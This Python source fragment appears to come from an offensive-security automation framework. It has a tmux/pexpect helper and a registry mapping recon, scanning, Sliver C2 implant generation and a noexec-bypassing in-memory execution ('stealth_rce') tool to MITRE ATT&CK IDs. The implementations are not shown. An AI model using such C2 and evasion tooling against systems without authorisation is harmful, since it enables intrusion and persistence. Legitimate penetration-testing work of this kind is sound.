def run_interactive(tool: str, command: str, timeout: int = 60, expect_prompt: str = None, send_input: str = None) -> Dict:
    if not (_TMUX_AVAILABLE and _PEXPECT_AVAILABLE):
        return {"output": "", "error": "tmux or pexpect not available", "rc": -1}
    session = f"phalanx_{tool}_{int(time.time())}"
    try:
        subprocess.run(["tmux", "new-session", "-d", "-s", session, tool], check=True)
        subprocess.run(["tmux", "send-keys", "-t", session, command, "Enter"], check=True)
        if expect_prompt:
            child = pexpect.spawn(f"tmux capture-pane -p -t {session}")
            child.expect(expect_prompt, timeout=timeout)
            if send_input:
                subprocess.run(["tmux", "send-keys", "-t", session, send_input, "Enter"], check=True)
        child = pexpect.spawn(f"tmux capture-pane -p -t {session}")
        child.expect(pexpect.EOF, timeout=timeout)
        output = child.before.decode("utf-8", errors="ignore")
        subprocess.run(["tmux", "kill-session", "-t", session])
        return {"output": output, "error": None, "rc": 0}
    except Exception as e:
        return {"output": "", "error": str(e), "rc": -1}

# ================================
# TOOL REGISTRY (all tools)
# ================================
TOOL_REGISTRY: Dict[str, Dict] = {
    "nmap":           {"fn": run_nmap,           "desc": "Full nmap -sV -sC scan",                "tags": ["recon", "network"], "mitre": ["T1595", "T1046"]},
    "nmap_quick":     {"fn": run_nmap_quick,     "desc": "Fast top-1000 port scan",               "tags": ["recon", "network", "fast"], "mitre": ["T1595"]},
    "nikto":          {"fn": run_nikto,          "desc": "Web vulnerability scanner",             "tags": ["web", "vuln"], "mitre": ["T1595.002"]},
    "whois":          {"fn": run_whois,          "desc": "WHOIS domain/IP lookup",                "tags": ["recon", "osint"], "mitre": ["T1591"]},
    "dig":            {"fn": run_dig,            "desc": "DNS record lookup",                     "tags": ["recon", "dns"], "mitre": ["T1590.002"]},
    "http_probe":     {"fn": run_http_probe,     "desc": "HTTP header grab + status",             "tags": ["web", "recon"], "mitre": ["T1595.002"]},
    "whatweb":        {"fn": run_whatweb,        "desc": "Web technology fingerprint",            "tags": ["web", "recon"], "mitre": ["T1595.002"]},
    "gobuster":       {"fn": run_gobuster_dirs,  "desc": "Web directory brute-force",             "tags": ["web", "bruteforce"], "mitre": ["T1595.002"]},
    "subfinder":      {"fn": run_subfinder,      "desc": "Passive subdomain enumeration",         "tags": ["recon", "dns", "osint"], "mitre": ["T1590.002"]},
    "theharvester":   {"fn": run_theharvester,   "desc": "Email/domain OSINT harvester",          "tags": ["osint", "recon"], "mitre": ["T1591"]},
    "enum4linux":     {"fn": run_enum4linux,     "desc": "SMB/NetBIOS enumeration",               "tags": ["network", "smb"], "mitre": ["T1590.005"]},
    "searchsploit":   {"fn": run_searchsploit,   "desc": "Search exploit-db for known exploits",  "tags": ["exploit", "cve"], "mitre": ["T1588.005"]},
    "ssl_check":      {"fn": run_ssl_check,      "desc": "TLS/SSL certificate audit",             "tags": ["web", "crypto"], "mitre": ["T1587.003"]},
    "banner_grab":    {"fn": run_banner_grab,    "desc": "TCP banner grab",                       "tags": ["recon", "network"], "mitre": ["T1595.001"]},
    "ffuf":           {"fn": run_ffuf,           "desc": "Fast web fuzzer",                       "tags": ["web", "bruteforce"], "mitre": ["T1595.002"]},
    "wpscan":         {"fn": run_wpscan,         "desc": "WordPress vulnerability scanner",       "tags": ["web", "cms"], "mitre": ["T1595.002"]},
    "sqlmap_detect":  {"fn": run_sqlmap_detect,  "desc": "SQL injection detection (safe)",        "tags": ["web", "sqli"], "mitre": ["T1190"]},
    "scrape":         {"fn": run_scrape,         "desc": "Web scraping (emails, links, forms)",    "tags": ["web", "recon", "osint"], "mitre": ["T1595.002"]},
    "sliver_start":   {"fn": run_sliver_start,   "desc": "Start Sliver C2 server",                "tags": ["c2"], "mitre": ["T1587.001"]},
    "sliver_auto_config": {"fn": run_sliver_auto_config, "desc": "Auto-configure Sliver C2",      "tags": ["c2"], "mitre": ["T1587.001"]},
    "sliver_generate":{"fn": run_sliver_generate_implant, "desc": "Generate Sliver implant",      "tags": ["c2"], "mitre": ["T1587.001"]},
    "sliver_sessions":{"fn": run_sliver_list_sessions, "desc": "List active Sliver sessions",     "tags": ["c2"], "mitre": ["T1059"]},
    "stealth_rce":    {"fn": run_stealth_rce,   "desc": "In-memory ELF execution (memfd+fexecve) bypassing noexec", "tags": ["exploit", "evasion"], "mitre": ["T1059", "T1106", "T1562.001"]},
    "copyright_osint":{"fn": run_copyright_osint, "desc": "OSINT scan for exposed copyrighted material and piracy indicators", "tags": ["osint", "copyright", "compliance"], "mitre": ["T1592", "T1593"]},
    "burp_scan":      {"fn": run_burp_scan,      "desc": "Burp Suite web vulnerability scanner",   "tags": ["web", "burp", "vuln"], "mitre": ["T1190", "T1595.002"]},
    "ghidra_analyze": {"fn": run_ghidra_analyze, "desc": "Ghidra headless binary analysis (functions, strings, vulns)", "tags": ["re", "binary", "ghidra"], "mitre": ["T1592", "T1588"]},
}

def run_tool(name: str, **kwargs) -> Dict:
    entry = TOOL_REGISTRY.get(name)
    if not entry:
        return {"tool": name, "output": "", "parsed": {}, "error": f"Unknown tool: {name}", "rc": -1}
    try:
        return entry["fn"](**kwargs)
    except TypeError as e:
        return {"tool": name, "output": "", "parsed": {}, "error": f"Bad arguments: {e}", "rc": -1}

def list_tools() -> List[Dict]:
    return [{"name": k, "desc": v["desc"], "tags": v["tags"], "mitre": v.get("mitre", [])} for k, v in TOOL_REGISTRY.items()]

def get_mitre_for_tool(tool_name: str) -> List[str]:
    return TOOL_REGISTRY.get(tool_name, {}).get("mitre", [])
